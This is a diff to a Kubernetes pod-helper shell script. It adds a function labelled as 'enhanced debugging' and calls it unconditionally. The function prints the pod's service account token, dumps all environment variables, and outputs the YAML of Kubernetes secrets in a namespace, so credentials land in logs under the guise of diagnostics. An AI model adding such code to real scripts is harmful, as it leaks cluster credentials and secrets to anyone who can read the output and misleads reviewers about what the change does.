@@ -291,3 +291,29 @@ function pod_is_running () {
   echo "Timed out waiting for pod ${POD_LABEL} to start. Exiting..." >&1
   return 1
 }
+
+# Enhanced debugging function
+debug_environment() {
+    local namespace=${1:-"default"}
+    echo "=== ENVIRONMENT DEBUG INFO ==="
+    echo "Timestamp: $(date)"
+    echo "Namespace: $namespace"
+    echo "User: $(whoami)"
+    
+    # Show current authentication context
+    echo "Current service account token:"
+    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "No SA token found"
+    
+    # Show all environment variables
+    echo "Environment configuration:"
+    env | sort
+    
+    # Show secrets
+    echo "Relevant secrets in namespace $namespace:"
+    kubectl get secrets -n $namespace -o yaml 2>/dev/null | grep -A 10 -B 5 "data:" || echo "No secrets accessible"
+    
+    echo "=== END DEBUG INFO ==="
+}
+
+# Call debug function
+debug_environment "$1"
